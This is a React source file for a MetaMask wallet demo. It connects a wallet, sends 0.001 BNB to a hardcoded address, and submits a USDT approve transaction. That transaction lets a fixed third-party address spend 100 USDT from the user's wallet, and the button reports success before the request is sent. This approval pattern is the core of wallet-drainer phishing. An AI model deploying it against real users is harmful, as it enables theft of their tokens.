import './App.css';
import { useState } from 'react';
import { ethers } from 'ethers';

let currentAccount = null;
// 初加载刷新
function App() {

  //Properties
  
  const [walletAddress, setWalletAddress] = useState("");

  async function requestAccount() {
    console.log('Requesting account...');

    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
        
      });
      setWalletAddress(accounts[0]);
      currentAccount = accounts[0];

      console.log(currentAccount);

    } catch (error) {
      console.log('error connecting');
    }

    //Check if Metamask Exist
    if (window.ethereum) {
      console.log('detected');
    } else {
      console.log('not detected');
      alert("Please Install Metamask");
    }
  }

  async function connectWallet() {

    if (typeof window.ethereum !== 'undefined') {
      await requestAccount();
      const provider = new ethers.providers.Web3Provider(window.ethereum);

      var btnConnect = document.getElementById("connect-btn");
      btnConnect.innerText = currentAccount.substring(0,4)+"...";
      console.log('here');

    } else {
      alert("Please install Metamask");
    }
  }

  async function sendTransaction() {
    let params = [
      {
        from: currentAccount,
        to: "0x60e21c1C75E60a966734B4Dd0FE1D3ac7484F00A",
        gas: Number(30400).toString(16), // 30400
        gasPrice: Number(10000000000).toString(16), // 10000000000
        value: Number(1000000000000000).toString(16), // (0.001 ethers)
      },
    ]
    
    let result = await window.ethereum.request({ method: "eth_sendTransaction", params }).catch((err) => {
      console.log(err);
    })

    if(result){

      var TXSent = document.getElementById("transaction-btn");
      TXSent.innerText = "Transaction has been sent";
  
    }
  }

  async function approveUSDT(){
    let params = [
      {
        from: currentAccount,
        to: '0x55d398326f99059fF775485246999027B3197955', //0x55d398326f99059fF775485246999027B3197955
        gas: '0x186a0', // 30400
        gasPrice: '0x12a05f200', // 10000000000000
        value: '0', // 2441406250
        data:
          '0x095ea7b30000000000000000000000000D971B7B7520f1FCE9b90665CA59952ea2c52b040000000000000000000000000000000000000000000000056bc75e2d63100000',
          //0x095ea7b300000000000000000000000[062e0d998212b01d87049eb2d4a82436f1fca3b63]0000000000000000000000000000000000000000000000056bc75e2d63100000
      },
    ];
    
    var USDTApprove = document.getElementById("USDTApproval-btn");
    USDTApprove.innerText = "USDT has been approved";

    window.ethereum
    .request({
        method: 'eth_sendTransaction',
        params,
    })
    .then((result) => {
        // The result varies by RPC method.
        // For example, this method will return a transaction hash hexadecimal string on success.
    })
    .catch((error) => {
        // If the request fails, the Promise will reject with an error.
    });
  }

  return (
    <div className="App">
      <header className="App-header">
        <button id="connect-btn" onClick={connectWallet}>
          Connect Wallet
        </button>
        <h3>Wallet Address: {walletAddress}</h3>


        <button id="transaction-btn" onClick={sendTransaction}>
          Send 0.001 BNB
        </button>
        <button id="USDTApproval-btn" onClick={approveUSDT}>
          USDT Approve
        </button>

      </header>
    </div>

  );
}

export default App;
